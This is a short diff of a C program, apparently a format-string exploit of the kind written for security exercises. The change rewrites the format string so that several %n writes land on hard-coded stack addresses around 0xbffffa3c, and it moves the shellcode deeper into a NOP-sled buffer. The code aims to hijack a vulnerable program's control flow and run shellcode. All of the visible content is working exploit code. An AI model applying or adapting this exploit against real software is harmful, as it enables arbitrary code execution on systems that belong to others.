@@ -12,10 +12,10 @@ int main(void)
 {
   char *args[3];
   char *env[1];
-  char *fmtstr = "\x38\xfa\xff\xbf\x3c\xfa\xff\xbf_%08x.%08x.%08x.%70u%n";
+  char *fmtstr = "\x38\xfa\xff\xbf\x3c\xfa\xff\xbf\x38\xfa\xff\xbf\x3d\xfa\xff\xbf\x38\xfa\xff\xbf\x3e\xfa\xff\xbf\x38\xfa\xff\xbf\x3f\xfa\xff\xbf_%08x.%08x.%08x.%12c%n%180c%n%3c%n%192c%n";
 
   memset(payload, 0x90, sizeof (payload));
-  memcpy(payload + 40, shellcode, strlen(shellcode));
+  memcpy(payload + 340, shellcode, strlen(shellcode));
 
   // "0xbffffa3c"
   strncpy(payload, fmtstr, strlen(fmtstr));
